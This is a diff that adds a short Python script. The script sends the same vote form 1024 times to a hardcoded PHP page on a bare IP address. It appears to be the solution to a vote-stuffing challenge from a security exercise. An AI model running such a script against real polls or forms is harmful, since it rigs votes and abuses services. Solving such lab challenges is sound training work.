@@ -1,0 +1,15 @@
+#!/usr/bin/python3
+
+
+import requests
+
+
+VOTES = 1024
+INPUT_IN_FORM = '388'
+BUTTON_TITLE = 'Submit'
+FORM = {'id': INPUT_IN_FORM, 'holdthedoor': BUTTON_TITLE}
+CUSTOM_URL = 'http://158.69.76.135/level0.php'
+HEADER = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+for i in range(VOTES):
+    stat_code = requests.post(CUSTOM_URL, data=FORM, headers=HEADER)
